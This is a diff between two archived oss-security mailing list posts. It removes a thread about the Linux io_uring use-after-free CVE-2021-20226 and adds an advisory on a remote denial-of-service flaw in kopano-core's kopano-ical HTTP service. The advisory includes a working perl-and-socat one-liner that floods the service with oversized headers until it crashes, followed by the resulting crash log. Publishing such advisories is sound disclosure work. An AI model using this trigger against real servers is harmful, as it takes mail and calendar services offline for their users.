@@ -1,112 +1,56 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/08/3
-Message-ID: <CAKx+4-qGABkT2ssKnXPrGY2_1BT0RKxr+-XiDnBcB0yFCP8mJw@mail.gmail.com>
-Date: Mon, 8 Feb 2021 15:00:18 +0530
-From: Rohit Keshri <rkeshri@...hat.com>
-To: oss-security@...ts.openwall.com, alex.gaynor@...il.com
-Subject: Re: CVE-2021-20226 kernel: use-after-free in io_uring feature
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/19/6
+Message-ID: <r4p33o1o-q1pp-8932-qso-36op579rn850@inai.de>
+Date: Fri, 19 Mar 2021 13:44:24 +0100 (CET)
+From: Jan Engelhardt <jengelh@...i.de>
+To: oss-security@...ts.openwall.com
+Subject: kopano-core 11.0.1: Remote DoS by memory exhaustion
 Content-Type: text/plain; charset=utf-8
 
-Hello,
 
-The flaw CVE-2021-20226 is identified as a use-after-free problem with
-breach to data integrity, confidentiality and system availability, and
-this may even cause escalated privileges with good troubleshooting
-skills.
+Initial publication, no CVE number yet (will request).
 
+# Affected versions
 
-I also wanted to add that the affected souce (as was reported for
-kernel v5.7.0) has been modified from v5.10 kernel version with patch
-233295130e53 with following cleanup details.
+  * kopano-core 11.0.1     (current head of 11.x branch)
+  * kopano-core 10.0.7     (head of 10.x branch)
+  * kopano-core 9.1.0      (head of 9.x branch)
+  * kopano-core 8.7.16
+  * it is believed this affects all versions to date,
+    including zarafa 7.2.6, the discontinued predecessor
+    project to Kopano, sometimes still in use.
 
-~~~
+The "kopano-ical" program implements a network service/trivial HTTP server.
+It imposes no length restrictions on HTTP headers, which can be exploited
+to memory-exhaust the process and have it terminate.
 
-$ git show 233295130e53
-commit 233295130e53c8dfe6dbef3f52634c3f7e44cd6a
-Author: Pavel Begunkov <asml.silence@...il.com>
-Date:   Sat Oct 10 18:34:06 2020 +0100
+# Trigger
 
-    io_uring: clean up ->files grabbing
+»
+  perl -e 'print "GET / HTTP/1.0\nHost: \n"; 
+           while(1) { print " " . "A" x 65000 . "\n"; }' |
+  socat - tcp-connect:kopano-ical.example.com:8080
 
-    Move work.files grabbing into io_prep_async_work() to all other work
-    resources initialisation. We don't need to keep it separately now, as
-    ->ring_fd/file are gone. It also allows to not grab it when a request
-    is not going to io-wq.
-..
+The exact port depends on configuration; 8000 is also typical choice.
 
-$ git tag --contains 233295130e53
-v5.10
-v5.10-rc1
-v5.10-rc2
-v5.10-rc3
-v5.10-rc4
-v5.10-rc5
-v5.10-rc6
-v5.10-rc7
-v5.11-rc1
-v5.11-rc2
-v5.11-rc3
-v5.11-rc4
-v5.11-rc5
-v5.11-rc6
-v5.11-rc7
+» systemctl status kopano-ical
+● kopano-ical.service - Kopano Groupware Core iCal/CalDAV Gateway
+   Loaded: loaded (/usr/lib/systemd/system/kopano-ical.service; enabled; vendor preset: disabled)
+   Active: failed (Result: signal) since Fri 2021-03-19 13:24:26 CET; 32s ago
+     Docs: man:kopano-ical(8)
+           man:kopano-ical.cfg(5)
+  Process: 2126 ExecStart=/usr/sbin/kopano-ical -F (code=killed, signal=ABRT)
+ Main PID: 2126 (code=killed, signal=ABRT)
 
-~~~
+kopano-ical[2126]: terminate called after throwing an instance of 'std::bad_alloc'
+kopano-ical[2126]: ----------------------------------------------------------------------
+kopano-ical[2126]: Fatal error detected. Please report all following information.
+kopano-ical[2126]: kopano-ical 8.7.16.0
+kopano-ical[2126]:   what():  std::bad_alloc
+systemd[1]: kopano-ical.service: Main process exited, code=killed, status=6/ABRT
+systemd[1]: kopano-ical.service: Unit entered failed state.
+systemd[1]: kopano-ical.service: Failed with result 'signal'.
 
-Regards,
-..
-Rohit Keshri / Red Hat Product Security Team
-PGP: OX01BC 858A 07B7 15C8 EF33 BFE2 2EEB 0CBC 84A4 4C2D
+# Mitigation
 
-secalert@...hat.com for urgent response
-
-
-On Mon, Feb 8, 2021 at 2:37 PM Alex Gaynor <alex.gaynor@...il.com> wrote:
-
-> Hey,
->
-> Your message says that this is a DoS, however the ZDI page says it's a
-> priv-esc. Which is right?
->
-> Alex
->
-> On Fri, Feb 5, 2021 at 10:00 AM Rohit Keshri <rkeshri@...hat.com> wrote:
-> >
-> > Hello Team,
-> >
-> > A use-after-free flaw was found in the io_uring in Linux kernel, where a
-> > local attacker with a user privilege could cause a denial of service
-> > problem on the system
-> >
-> > The issue results from the lack of validating the existence of an object
-> > prior to performing operations on the object by not incrementing the file
-> > reference counter while in use.
-> >
-> > The highest threat from this vulnerability is to data integrity,
-> > confidentiality and system availability.
-> >
-> >
-> > 'CVE-2021-20226' was assigned by Red Hat.
-> >
-> > This issue was reported by Ryota Shiga of Flatt Security Team.
-> >
-> >
-> > Reference:
-> >
-> > https://www.zerodayinitiative.com/advisories/ZDI-21-001/
-> >
-> >
-> > Thanks and Regards
-> > ..
-> > Rohit Keshri / Red Hat Product Security Team
-> > PGP: OX01BC 858A 07B7 15C8 EF33 BFE2 2EEB 0CBC 84A4 4C2D
-> >
-> > secalert@...hat.com for urgent response
->
->
->
-> --
-> All that is necessary for evil to succeed is for good people to do nothing.
->
->
-
+None known at this time.
